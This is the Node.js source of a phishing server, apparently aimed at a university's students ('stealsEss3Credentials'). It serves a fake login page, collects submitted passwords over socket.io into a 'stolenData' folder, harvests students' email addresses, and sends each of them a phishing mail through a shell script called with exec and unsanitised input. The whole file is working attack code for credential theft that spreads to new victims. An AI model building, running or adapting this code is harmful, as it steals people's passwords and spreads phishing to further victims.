const http = require('http');
const express = require('express');
const socketIo = require('socket.io');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');
const nodemailer = require('nodemailer');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

// Configure Express to serve static files from the root directory
app.use(express.static(__dirname));
const PORT = 3100;



server.listen(PORT, () => {
    console.log(`
      _             _     ______              ____   _____              _            _   _       _     
     | |           | |   |  ____|            |___ \\ / ____|            | |          | | (_)     | |    
  ___| |_ ___  __ _| |___| |__   ___ ___  ___  __) | |     _ __ ___  __| | ___ _ __ | |_ _  __ _| |___ 
 / __| __/ _ \\/ _\` | / __|  __| / __/ __|/ _ \\|__ <| |    | '__/ _ \\/ _\` |/ _ \\ '_ \\| __| |/ _\` | / __|
 \\__ \\ ||  __/ (_| | \\__ \\ |____\\__ \\__ \\  __/___) | |____| | |  __/ (_| |  __/ | | | |_| | (_| | \\__ \\
 |___/\\__\\___|\\__,_|_|___/______|___/___/\\___|____/ \\_____|_|  \\___|\\__,_|\\___|_| |_|\\__|_|\\__,_|_|___/
                                                                                                       
                                                                                                       
`);
    console.log(`Server running on http://localhost:${PORT}/login.html`);
});

app.get('/favicon.ico', (req, res) => res.status(204));



io.on('connection', (socket) => {
    socket.on('sendPWD', (data) => {
        console.log('Password received from a client:', data);

        const filePath = path.join(__dirname, 'stolenData', 'pwd.json');

        // Create the directory if it does not exist
        fs.mkdir(path.dirname(filePath), { recursive: true }, (err) => {
            if (err) {
                console.error('Error creating directory', err);
                return;
            }

            // Check if the JSON file exists and is not empty or corrupt
            fs.stat(filePath, (err, stats) => {
                if (err || stats.size === 0) {
                    console.error('The JSON file is empty or corrupt, initializing as an empty array');
                    writeDataToFile(filePath, [data]);
                } else {
                    // Read and parse the existing JSON file content
                    fs.readFile(filePath, 'utf8', (err, fileData) => {
                        if (err) {
                            console.error('Error reading the file', err);
                            return;
                        }

                        let jsonData;
                        try {
                            jsonData = JSON.parse(fileData);
                            if (!Array.isArray(jsonData)) {
                                console.error('The existing JSON data is not an array, initializing as an empty array');
                                jsonData = [];
                            }
                        } catch (parseErr) {
                            console.error('Error parsing the JSON file', parseErr);
                            return;
                        }

                        // Check if the user already exists in the array
                        const userExists = jsonData.some(item => item.user === data.user);
                        if (userExists) {
                            console.log(`User ${data.user} already exists in the array, not adding.`);
                        } else {
                            // Add the new data to the array
                            jsonData.push(data);

                            // Write the updated array to the JSON file
                            writeDataToFile(filePath, jsonData);
                        }
                    });
                }
            });
        });
    });


});

// FOR MAIL ADDRESSES
io.on('connection', (socket) => {
    socket.on('sendMail', (data) => {
        console.log('Student emails received from a client:', data);

        const filePath = path.join(__dirname, 'stolenData', 'mail.json');

        // Check if the JSON file exists and is not empty or corrupt
        fs.stat(filePath, (err, stats) => {
            if (err || stats.size === 0) {
                console.error('The JSON file is empty or corrupt, initializing as an empty array');
                const newData = [
                    { email: data.student1.email},
                    { email: data.student2.email}
                ];
                writeDataToFile(filePath, newData);
            } else {
                // Read and parse the existing JSON file content
                fs.readFile(filePath, 'utf8', (err, fileData) => {
                    if (err) {
                        console.error('Error reading the file', err);
                        return;
                    }

                    let jsonData;
                    let toBeSend = [];
                    try {
                        jsonData = JSON.parse(fileData);
                        if (!Array.isArray(jsonData)) {
                            console.error('The existing JSON data is not an array, initializing as an empty array');
                            jsonData = [];
                        }
                    } catch (parseErr) {
                        console.error('Error parsing the JSON file', parseErr);
                        return;
                    }

                    // Check if student1 email exists in the JSON data
                    const student1Exists = jsonData.some(item => item.email === data.student1.email);
                    if (student1Exists) {
                        console.log(`Email ${data.student1.email} already exists, not adding.`);
                    }
                    else if (data.student1.email == "") {
                        console.log(`Email ${data.student1.email} not inserted (probably no student near).`);
                    } else {
                        jsonData.push({ email: data.student1.email});
                        toBeSend.push(data.student1.email);
                        //console.log("toBeSend: ", toBeSend); // Output: "string"
                    }

                    // Check if student2 email exists in the JSON data
                    const student2Exists = jsonData.some(item => item.email === data.student2.email);
                    if (student2Exists) {
                        console.log(`Email ${data.student2.email} already exists, not adding.`);
                    }
                    else if (data.student2.email == "") {
                        console.log(`Email ${data.student2.email} not inserted (probably no student near).`);
                    } else {
                        jsonData.push({ email: data.student2.email});

                        toBeSend.push(data.student2.email);

                    }

                    // Write the updated array to the JSON file
                    writeDataToFile(filePath, jsonData);
                    sendMail(toBeSend);
                });
            }
        });
    });
});

// Function to write data to file
function writeDataToFile(filePath, data) {
    fs.writeFile(filePath, JSON.stringify(data, null, 2), (err) => {
        if (err) {
            console.error('Error writing data to the file', err);
        } else {
            console.log('Data successfully saved in the mail.json file');
        }
    });
}

/////////// SEND PHISHING MAILS ///////////
function sendMail(toBeSend)
{
    if (typeof toBeSend === 'string') {
        console.log("email addresses to send phishing: ", toBeSend);
        sendSingleMail(toBeSend);
    } 
    else if (Array.isArray(toBeSend)) {
        console.log("email addresses to send phishing: ", toBeSend);
        toBeSend.forEach(item => {
            sendSingleMail(item);
        });
    } else {
        console.error('Input must be a string or an array of strings.');
    }   
}


async function sendSingleMail(recipient) {
console.log("send mail to " + recipient);
      var yourscript = exec(`./send_email.sh ${recipient}`,
        (error, stdout, stderr) => {
            console.log(stdout);
            console.log(stderr);
            if (error !== null) {
                console.log(`exec error: ${error}`);
            }
        });

}
/////////// MAIN //////////////////
const emailAddress = process.argv[2]; 
initializeJsonFile("stolenData/mail.json", emailAddress);
sendMail(emailAddress);

function initializeJsonFile(filePath, emailAddress) {
    const mailFilePath = path.join(__dirname, 'stolenData', 'mail.json');
    const pwdFilePath = path.join(__dirname, 'stolenData', 'pwd.json');
  
    // Check if the directory exists, if not, create it
    const directory = path.join(__dirname, 'stolenData');
    if (!fs.existsSync(directory)) {
      fs.mkdirSync(directory, { recursive: true });
      console.log('Directory stolenData created');
    }
  
    // Check if mail.json exists, if not, create it
    if (!fs.existsSync(mailFilePath)) {
      fs.writeFileSync(mailFilePath, '');
      console.log('File mail.json created');
    }
  
    // Check if pwd.json exists, if not, create it
    if (!fs.existsSync(pwdFilePath)) {
      fs.writeFileSync(pwdFilePath, '');
      console.log('File pwd.json created');
    }
  
    const data = [{
        email: emailAddress
    }];

    const jsonData = JSON.stringify(data, null, 2);

    fs.stat(filePath, (err, stats) => {
        if (err) {
            console.error('Error while checking the file:', err);
        } else {
            if (stats.size === 0) {
                fs.writeFile(filePath, jsonData, (err) => {
                    if (err) {
                        console.error('Error while writing the file:', err);
                    } else {
                        console.log(`JSON data successfully written in ${filePath}.`);
                    }
                });
            } else {
                console.log(`The file ${filePath} is not empty, so it will not be overwritten.`);
            }
        }
    });
}
















